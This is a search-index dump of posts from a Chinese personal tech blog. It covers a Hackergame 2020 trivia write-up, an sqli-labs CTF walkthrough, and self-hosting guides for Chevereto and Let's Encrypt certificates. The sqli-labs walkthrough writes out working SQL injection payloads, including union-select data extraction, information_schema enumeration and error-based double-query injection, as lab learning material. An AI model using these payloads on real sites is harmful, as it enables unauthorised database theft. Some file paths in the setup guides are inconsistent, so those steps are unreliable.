最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。 ​ 答案就是Teeworlds ​ 我还摸到了他们当天活动的记录资料：点我 ​ 在slides\\闪电演讲\\Teeworlds文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣 参考答案：9 第四题 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？ ​ 直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。 参考答案：9 第五题 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？ ​ 百度中国科学技术大学第六届信息安全大赛有个...圆满结束，就他了。点开第二行就是经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag。（看这个网站的标志似乎还是第三题搜的那个USTC Linux 用户协会的官网新闻。嗷原来题目上已经说了是举办方👀） 参考答案：17098 完工。 ","date":"2020-11-01","objectID":"/posts/ctf/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/ctf/hackgame20201/#第二题"},{"categories":["CTF"],"content":"\r猫咪问题++​ 秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解 ​ 题意思很明显的书考验同学的搜题技巧。那就开工。 第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce. 提示：学术上一般认为龙不属于哺乳动物。 ​ 本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。 ​ 一个比较有印象就是FreeDOS这个标志就离谱，什么玩意 参考答案 ：12 第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​ 卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。 参考答案：256 第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？ ​ 搜索USTC Linux 用户协会发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的新闻版块（百度搜出来的是旧站，里面有新站的网址）。题目中还写道2019年9月21日自由软件日活动，那么官网肯定有那天的新闻。 ​ 找到一篇当天的新闻2019 软件自由日中国科大站，进取直接找，文章末尾有 最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。 ​ 答案就是Teeworlds ​ 我还摸到了他们当天活动的记录资料：点我 ​ 在slides\\闪电演讲\\Teeworlds文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣 参考答案：9 第四题 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？ ​ 直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。 参考答案：9 第五题 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？ ​ 百度中国科学技术大学第六届信息安全大赛有个...圆满结束，就他了。点开第二行就是经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag。（看这个网站的标志似乎还是第三题搜的那个USTC Linux 用户协会的官网新闻。嗷原来题目上已经说了是举办方👀） 参考答案：17098 完工。 ","date":"2020-11-01","objectID":"/posts/ctf/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/ctf/hackgame20201/#第三题"},{"categories":["CTF"],"content":"\r猫咪问题++​ 秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解 ​ 题意思很明显的书考验同学的搜题技巧。那就开工。 第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce. 提示：学术上一般认为龙不属于哺乳动物。 ​ 本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。 ​ 一个比较有印象就是FreeDOS这个标志就离谱，什么玩意 参考答案 ：12 第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​ 卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。 参考答案：256 第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？ ​ 搜索USTC Linux 用户协会发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的新闻版块（百度搜出来的是旧站，里面有新站的网址）。题目中还写道2019年9月21日自由软件日活动，那么官网肯定有那天的新闻。 ​ 找到一篇当天的新闻2019 软件自由日中国科大站，进取直接找，文章末尾有 最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。 ​ 答案就是Teeworlds ​ 我还摸到了他们当天活动的记录资料：点我 ​ 在slides\\闪电演讲\\Teeworlds文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣 参考答案：9 第四题 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？ ​ 直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。 参考答案：9 第五题 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？ ​ 百度中国科学技术大学第六届信息安全大赛有个...圆满结束，就他了。点开第二行就是经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag。（看这个网站的标志似乎还是第三题搜的那个USTC Linux 用户协会的官网新闻。嗷原来题目上已经说了是举办方👀） 参考答案：17098 完工。 ","date":"2020-11-01","objectID":"/posts/ctf/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/ctf/hackgame20201/#第四题"},{"categories":["CTF"],"content":"\r猫咪问题++​ 秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解 ​ 题意思很明显的书考验同学的搜题技巧。那就开工。 第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce. 提示：学术上一般认为龙不属于哺乳动物。 ​ 本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。 ​ 一个比较有印象就是FreeDOS这个标志就离谱，什么玩意 参考答案 ：12 第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​ 卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。 参考答案：256 第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？ ​ 搜索USTC Linux 用户协会发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的新闻版块（百度搜出来的是旧站，里面有新站的网址）。题目中还写道2019年9月21日自由软件日活动，那么官网肯定有那天的新闻。 ​ 找到一篇当天的新闻2019 软件自由日中国科大站，进取直接找，文章末尾有 最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。 ​ 答案就是Teeworlds ​ 我还摸到了他们当天活动的记录资料：点我 ​ 在slides\\闪电演讲\\Teeworlds文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣 参考答案：9 第四题 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？ ​ 直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。 参考答案：9 第五题 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？ ​ 百度中国科学技术大学第六届信息安全大赛有个...圆满结束，就他了。点开第二行就是经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag。（看这个网站的标志似乎还是第三题搜的那个USTC Linux 用户协会的官网新闻。嗷原来题目上已经说了是举办方👀） 参考答案：17098 完工。 ","date":"2020-11-01","objectID":"/posts/ctf/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/ctf/hackgame20201/#第五题"},{"categories":["CTF"],"content":"\r前言在线靶机地址：https://buuoj.cn/challenges#sqli-labs ","date":"2020-09-22","objectID":"/posts/ctf/sql-labs1/:1:0","series":null,"tags":["sql注入"],"title":"sql-labs(一)","uri":"/posts/ctf/sql-labs1/#前言"},{"categories":["CTF"],"content":"\rless-1​ 首先说明sql注入的大致步骤： 判断注入类型。如整型字符型注入等。 判断列数 判断数据的回显位 构造sql语句 ​ 根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句?id=1'，发现数据库报错 ​ 通过后面的报错语句1'' LIMIT 0,1的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询union插入我们想要查询的语句。 ​ 推出数据库的查询的部分语句可能为where id = '$id'LIMIT 0,1，那么通过构造闭合?id=1' [这里添加语句] --+添加自己想要语句，语句后面的--+作用是将后面的其他语句注释掉。 ​ 首先是判断字段个数：?id=1' order by 1 --+，页面显示正常，直到尝试?id=1' order by 4 --+发现数据库报错 ​ 说明数据库的字段值只有四个。 ​ 接下来测试数据的回显位，构造语句?id=' union select 1,2,3 --+，这里需要注意的有，前面id的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面union构造的语句就不会显示；union连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。 ​ 执行后页面显示。 ​ 说明查询语句的2,3是回显位，之后就可以将查询的语句进行替换。如： ​ 获取数据库版本，数据库路径，当前用户，当前数据库： ​ ?id=' union select 1,concat_ws('_',user(),version(),database()),@@basedir --+ 页面显示 ​ 利用元数据库来爆表、爆数据 ​ ?id=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ ​ 之后大家可以自行发挥。 ​ flag的话我做的题是在ctftraining.flag表中，答案在：?id=' union select 1,flag,3 from ctftraining.flag --+ ","date":"2020-09-22","objectID":"/posts/ctf/sql-labs1/:2:0","series":null,"tags":["sql注入"],"title":"sql-labs(一)","uri":"/posts/ctf/sql-labs1/#less-1"},{"categories":["CTF"],"content":"\rless-2​ 第二题看题目名称intiger based知大意，是id的数据类型由字符型变成了数字类型，这次就不使用单引号直接构造语句，和第一题差不多。 ","date":"2020-09-22","objectID":"/posts/ctf/sql-labs1/:3:0","series":null,"tags":["sql注入"],"title":"sql-labs(一)","uri":"/posts/ctf/sql-labs1/#less-2"},{"categories":["CTF"],"content":"\rless-3​ 看标题Single quotes with twist，是在前面题的基础上加上了括号包裹，所以语句就成了where id = ('id')所以我们闭合的方式也要改变。附源码 ","date":"2020-09-22","objectID":"/posts/ctf/sql-labs1/:4:0","series":null,"tags":["sql注入"],"title":"sql-labs(一)","uri":"/posts/ctf/sql-labs1/#less-3"},{"categories":["CTF"],"content":"\rless-4​ 标题Double Quotes，说明是个引号注入，把前面题的单引号改成双引号构成闭合即可。 ","date":"2020-09-22","objectID":"/posts/ctf/sql-labs1/:5:0","series":null,"tags":["sql注入"],"title":"sql-labs(一)","uri":"/posts/ctf/sql-labs1/#less-4"},{"categories":["CTF"],"content":"\rless-5​ 标题Double Injection-Single Quotes，很明显提示是单引号，然后套用前面的方法， 发现这次题目变了，不管输入啥页面只显示一个You are in...........，但是数据库报错还是会显示，只要数据库错误还能显示，我们就可以是用一个新的技术把数据显示在错误信息上。 ​ 双查询注入也是我第一次听，贴一个讲大致原理的帖子：点我。 ​ 构造语句： ?id=' union select 1,2,3 from (select 1,count(*),concat_ws('____________',floor(rand()*2),concat_ws('********',version(),database()))a from information_schema.tables group by a)b --+ ​ 讲一下CONCAT_WS(separator,str1,str2,…)函数的用法：把str1、str2连接起来，并使用separator做分隔符。 ","date":"2020-09-22","objectID":"/posts/ctf/sql-labs1/:6:0","series":null,"tags":["sql注入"],"title":"sql-labs(一)","uri":"/posts/ctf/sql-labs1/#less-5"},{"categories":["瞎折腾"],"content":"博客搭完了，自己选择的这个博客主题又是以图片为主要元素的，当然要考虑图片的使用问题了，原来打算直接放在服务器上，但是后来想了想，以后如果文章越写越多用的图太多服务器的流量也不够用，想到了图床这一托管图片的服务，但是放在别人的上面总怕会受到限制，正好发现了Chevereto这一图床系统，可以自己搭建一个图床服务器，正好自己还有一个阿里云学生云，那就开工。 ","date":"2020-09-20","objectID":"/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/:0:0","series":null,"tags":["图床"],"title":"Chevereto-搭建一个自己的图床","uri":"/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/#"},{"categories":["瞎折腾"],"content":"\rChevereto 说明 Chevereto是一个可以帮助你建立自己的图像分享网站（图床）的应用程序，我们的目标是可以让世界上的任何一个人都可以建立自己的图像共享平台。我们坚定不移的为那些想要可定制的白标图像共享服务的人建立一个真正的替代品。 Chevereto分为免费版和付费版，区别肯定就是大小什么的，我这个搭在学生云上肯定就不用想我会选择哪个了吧🤣 ","date":"2020-09-20","objectID":"/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/:0:1","series":null,"tags":["图床"],"title":"Chevereto-搭建一个自己的图床","uri":"/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/#chevereto-说明"},{"categories":["瞎折腾"],"content":"\r环境说明因为Chevereto所需要的环境为 Apache/Nginx PHP 5.5+ MySQL 5.0+ 我太懒了不想动所以我选择使用宝塔面板为我们搭建web环境。 宝塔面板官网：https://www.bt.cn/ 安装完成以后进入管理面板应该会直接提示你安装需要的环境 我的环境如下图 ","date":"2020-09-20","objectID":"/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/:0:2","series":null,"tags":["图床"],"title":"Chevereto-搭建一个自己的图床","uri":"/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/#环境说明"},{"categories":["瞎折腾"],"content":"\r总结安装步骤 去github下载Chevereto的压缩包。 在宝塔面板上新建网站目录，创建一个存图片的数据库(自行创建)。 将Chevereto的压缩包上传到网站目录解压。 访问新建的网站就是Chevereto的管理面板，并进行初始配置。 无了。 ","date":"2020-09-20","objectID":"/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/:0:3","series":null,"tags":["图床"],"title":"Chevereto-搭建一个自己的图床","uri":"/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/#总结安装步骤"},{"categories":["瞎折腾"],"content":"\r开始 github下载地址 创建网站目录和数据库用户 因为我域名所以域名留空，提示默认使用80端口，访问地址就是服务器ip地址，剩下的自己随机发挥。 创建完成后需要配置一下网站配置文件才可以访问到配置页面。 在server{...}中添加 nginx location / { try_files $uri $uri/ /index.php?$query_string; }\r配置完成以后应该会自动保存并重启Nginx。 将在github上下载的Chevereto压缩包上传到刚刚创建的网站目录中（上图是/www/wwwroot）并解压。 之后就可以直接访问服务器ip:80（80端口可以省略），然后一步一步的进行配置。 可能会出现的错误 Chevereto can’t create the app/settings.php file. You must manually create this file 解决方法：这个错误就是没有找到setting.php配置文件，压缩包内似乎没有创建该文件，我们可以自行创建，在Chevereto的网站目录下的/app目录下执行命令创建文件，并修改文件权限 shell touch settings.php chmod +x settings.php\r我自己还遇到了第二个错误，大概的意思就是访问权限不足blahbalhblahbla，我改了好久都不行。最后直接把整个网站目录的权限给改了访问成功。知道这样做不对，希望大佬能指点。 访问网站进行网站的初始化配置，大概就是填写数据库名称、数据库账号密码、管理员的账户和密码和一些信息。 完成以后就可以登陆管理员账号进入管理面板，我是首先去设置里找到语言设置把面板改成了中文。 ","date":"2020-09-20","objectID":"/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/:0:4","series":null,"tags":["图床"],"title":"Chevereto-搭建一个自己的图床","uri":"/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/#开始"},{"categories":["瞎折腾"],"content":"\r完工管理面板还有好多其他功能，我都还没研究过，大伙可以以后可以自己慢慢学习 然后我的图床地址：http://47.97.231.10/ (已失效) 🈚👇👻来丶se兔 ","date":"2020-09-20","objectID":"/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/:0:5","series":null,"tags":["图床"],"title":"Chevereto-搭建一个自己的图床","uri":"/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/#完工"},{"categories":["瞎折腾"],"content":"参考文章:Let’s Encrypt，免费好用的 HTTPS 证书 ","date":"2020-09-03","objectID":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:0","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#"},{"categories":["瞎折腾"],"content":"\r先放官网Let’s Encrypt Let’s Encrypt 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛 所需环境 一个 HTTP 服务，以 Nginx 为例 python 两个目录: /site 网站目录 /site_site_cert 保存证书的目录 证书的颁发有两种方式： 通过在线生成通过网址在线生成，需要验证文件 通过程序生成通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。 我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let’s Encrypt会对网站进行访问，下载密钥进行验证。 ","date":"2020-09-03","objectID":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:1","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#先放官网"},{"categories":["瞎折腾"],"content":"\r先放官网Let’s Encrypt Let’s Encrypt 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛 所需环境 一个 HTTP 服务，以 Nginx 为例 python 两个目录: /site 网站目录 /site_site_cert 保存证书的目录 证书的颁发有两种方式： 通过在线生成通过网址在线生成，需要验证文件 通过程序生成通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。 我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let’s Encrypt会对网站进行访问，下载密钥进行验证。 ","date":"2020-09-03","objectID":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:1","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#所需环境"},{"categories":["瞎折腾"],"content":"\r先放官网Let’s Encrypt Let’s Encrypt 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛 所需环境 一个 HTTP 服务，以 Nginx 为例 python 两个目录: /site 网站目录 /site_site_cert 保存证书的目录 证书的颁发有两种方式： 通过在线生成通过网址在线生成，需要验证文件 通过程序生成通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。 我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let’s Encrypt会对网站进行访问，下载密钥进行验证。 ","date":"2020-09-03","objectID":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:1","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#通过在线生成"},{"categories":["瞎折腾"],"content":"\r先放官网Let’s Encrypt Let’s Encrypt 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛 所需环境 一个 HTTP 服务，以 Nginx 为例 python 两个目录: /site 网站目录 /site_site_cert 保存证书的目录 证书的颁发有两种方式： 通过在线生成通过网址在线生成，需要验证文件 通过程序生成通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。 我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let’s Encrypt会对网站进行访问，下载密钥进行验证。 ","date":"2020-09-03","objectID":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:1","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#通过程序生成"},{"categories":["瞎折腾"],"content":"\r开工","date":"2020-09-03","objectID":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:2","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#开工"},{"categories":["瞎折腾"],"content":"\r创建账号首先创建一个目录，我是在根目录下创建文件夹site_cert shell mkdir /site_cert\r这个文件夹用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个RSA私钥，用于Let’s Encrypt识别你的身份 shell openssl genrsa 4096 \u003e account.key\r","date":"2020-09-03","objectID":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:3","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#创建账号"},{"categories":["瞎折腾"],"content":"\r创建CSR文件在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥） shell openssl genrsa 4096 \u003e domain.key\r我参考的文章提到了两种私钥RSA和ECC，我现在也还不懂什么原理，把两种区别放出来吧 RSA 私钥：兼容性好 ECC 私钥：部分老旧操作系统、浏览器不支持。优点是证书体积小 两个用于身份身份验证的私钥文件创建好，就可以生成CSR（Certificate Signing Request，证书签名请求）文件了，申请时可以把域名带 www 和不带 www 的两种情况都加进去，一张证书最多可以包含100个域名。 shell openssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config \u003c(cat /etc/ssl/openssl.cnf \u003c(printf \"[SAN]\\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com\")) \u003e domain.csr\r其中DNS的yoursite.com和www.yoursite.com记得要换成自己的域名 我在这里遇到了问题提示找不到/etc/ssl/openssl.cnf文件，在网上找的的解决办法是 执行 : shell openssl version -a\r会输出openssl的信息，其中OPENSSLDIR对应的路径就是openssl.cnf文件的地址，自行将上面的cat /etc/ssl/openssl.cnf,改为自己的路径运行。 ","date":"2020-09-03","objectID":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:4","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#创建csr文件"},{"categories":["瞎折腾"],"content":"\r配置验证服务前面介绍过了Let’s Encrypt验证的原理是在你的服务器上生成一个随机文件，在通过创建CSR时的域名进行访问下载，如果成功表明你对这个域名的拥有权。 创建用于存放网站的目录site以及用于验证文件存放的子目录 shell mkdir -p /site/.well-known/acme-challenge/\r然后再Nginx中配置: nginx server { server_name www.yoursite.com yoursite.com; location ^~ /.well-known/acme-challenge/ { alias /home/xxx/www/challenges/; try_files $uri =404; } location / { rewrite ^/(.*)$ https://yoursite.com/$1 permanent; } }\r别忘了改yoursite 这个配置会优先查找/site目录下的网站，建议保留以后证书认证还可以用到，因为颁发的证书一次可以使用90天。 ","date":"2020-09-03","objectID":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:5","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#配置验证服务"},{"categories":["瞎折腾"],"content":"\r获取网站证书先下载acme-tiny脚本到之前的site_cert目录： shell wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py\r指定账户私钥、CSR以及网站上验证文件的目录，执行脚本: shell python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ \u003e ./signed.crt\r执行成功的话会在当前目录生成一个signed.crt文件，这个文件就是申请好的证书文件。 我在这里出现了错误提示 text ValueError: Wrote file to /site/.well-known/acme-challenge/blablabla, but couldn't download http://www.yoursite.com/.well-known/acme-challenge/blablabla\r大概的意思就是，在网站目录里写入了一个验证文件，但是Let’s Encrypt的服务器访问不到你的网站，建议先去看一看Nginx配置是否出错，再有可能是自己的域名无法在国外解析，建议暂时使用国外的DNS解析商。推荐的有： Hurricane Electric Free DNS ZoneEdit CloudFlare 这些都是免费的，但是因为我自己的域名后缀为.tk，上面第一个DNS解析商警告因为.tk域名滥用，不给解析。 网站证书到手以后，还要下载 Let’s Encrypt 的中间证书。证书链中大部分都是「站点证书 – 中间证书 – 根证书」这样三级。服务端只需要发送前两个证书即可。我们需要把中间证书和网站证书合在一起： shell wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem \u003e intermediate.pem cat signed.crt intermediate.pem \u003e chained.pem\r最终，在Nginx中添加证书配置，并reload，我的部分配置如下 nginx server { listen 443 ssl; ssl_certificate /site_cert/chained.pem; ssl_certificate_key /site_cert/domain.key; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers HIGH:!aNULL:!MD5; server_name braindance.tk; index index.html index.htm; root ………………………… }\r执行 shell nginx -s reload\r","date":"2020-09-03","objectID":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:6","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#获取网站证书"},{"categories":["瞎折腾"],"content":"\r证书自动更新 计划任务​ 至此我们已经成功的获取到了Https证书，但是获取到的Https证书只有90天的时效，到期的话还需要使用相同的方法进行更新，为了避免某次忘记更新导致网站出现问题，我们可以使用linux中的crond服务为我们自动更新证书。 用 vi 在 /site_cert 文件夹 创建 计划任务脚本 renew_cert.sh shell vi /site_cert/renew_cert.sh\r通过vi输入以下内容 shell #!/bin/bash cd /fakesite_cert/ python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ \u003e ./signed.crt || exit wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem \u003e intermediate.pem cat signed.crt intermediate.pem \u003e chained.pem nginx -s reload\r更新的大致过程是，运行python脚本再次更新signed.crt申请证书文件，再进行证书合并写入chained.pem文件。 然后给这个文件赋予 可执行 属性 shell chmod +x /fakesite_cert/renew_cert.sh\r使用crontab -e指令打开定时任务配置文件，并加入以下内容。 text 0 0 1 * * /home/xxx/shell/renew_cert.sh \u003e/dev/null 2\u003e\u00261\r对于上面指令的具体意思请自行搜索crontab命令 ","date":"2020-09-03","objectID":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:7","series":null,"tags":null,"title":"Let_s_Encrypt 